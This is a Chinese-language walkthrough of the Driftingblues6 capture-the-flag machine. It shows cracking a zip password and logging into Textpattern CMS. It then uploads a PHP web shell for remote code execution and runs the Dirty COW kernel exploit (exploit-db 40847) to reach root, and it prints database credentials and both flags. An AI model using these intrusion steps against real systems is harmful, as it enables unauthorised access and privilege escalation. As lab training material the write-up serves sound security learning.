# Driftingblues6

2024-11-10 https://hackmyvm.eu/machines/machine.php?vm=Driftingblues6

## IP

192.168.5.39

## Scan

```
PORT   STATE SERVICE
80/tcp open  http
```

只开放了一个 web 端口，查看其首页，显示一张图片，查看 html 源码，底部有注释：

```
please hack vvmlist.github.io instead
he and their army always hacking us -->
```

http://192.168.5.39/robots.txt 中有提示：

```
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

在 gobuster 中添加 zip 后缀，扫描出一个 zip 路径 http://192.168.5.39/spammer.zip 使用 john 进行破解，密码为 myspace4 进行解压，其内容为：

```
mayer:lionheart
```

在访问上面 robots.txt 中禁止的路径 http://192.168.5.39/textpattern/textpattern/ 使用上面的凭据进行登陆，登陆成功。

显示的是一个 Textpattern CMS v4.8.3 的 CMS，经过搜索，存在任意文件上传漏洞，可以上传 php 从而实现 RCE，在顶部菜单 Contents -> Files 中上传 web shell，然后访问：

```
curl http://192.168.5.39/textpattern/files/8888.php
```

就获得了反弹的 shell。

发现 CMS 数据库的配置文件：

```
www-data@driftingblues:/var/www/textpattern/textpattern$ cat config.php
<?php
$txpcfg['db'] = 'textpattern_db';
$txpcfg['user'] = 'drifter';
$txpcfg['pass'] = 'imjustdrifting31';
$txpcfg['host'] = 'localhost';
$txpcfg['table_prefix'] = '';
$txpcfg['txpath'] = '/var/www/textpattern/textpattern';
$txpcfg['dbcharset'] = 'utf8mb4';
```

密码也不是 root 用户的密码。

lin peas 也没有枚举出其他路径，最后只能尝试内核提权：https://www.exploit-db.com/download/40847

```
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s
```

在 /root 目录下获得了 user flag 和 root flag：

```
root@driftingblues:~# cd /root
root@driftingblues:~# ls
root.txt  user.txt
root@driftingblues:~# cat user.txt
5355B03AF00225CFB210AE9CA8931E51
root@driftingblues:~# cat root.txt
CCAD89B795EE7BCF7BBAD5A46F40F488
```
